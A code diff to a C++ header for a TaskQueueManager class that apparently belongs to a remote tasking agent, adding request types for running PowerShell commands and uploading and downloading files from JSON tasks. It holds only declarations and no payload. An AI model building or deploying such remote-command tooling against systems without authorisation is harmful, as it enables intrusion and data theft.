@@ -6,16 +6,20 @@
 #include "Command.h"
 #include "Task.h"
 
-class TaskQueueManager {
+using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<bool>, TaskRequest<CommandUploadFile>, TaskRequest<CommandDownloadFile>>;
+using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
+class TaskQueueManager
+{
 public:
 	TaskQueueManager();
 	bool HasPendingResult();
 	bool HasPendingTask();
-	void StoreTaskResult(Response& response);
+	void StoreTaskResult(Response &response);
 	std::string GetTaskResults();
 	void QueueTask(std::string);
 	Request GetNextTask();
-	Request ParseTaskRequest(const std::string& rawJson);
+	Request ParseTaskRequest(const std::string &rawJson);
+
 private:
 	std::deque<Response> taskResults;
 	std::queue<std::string> taskQueue;
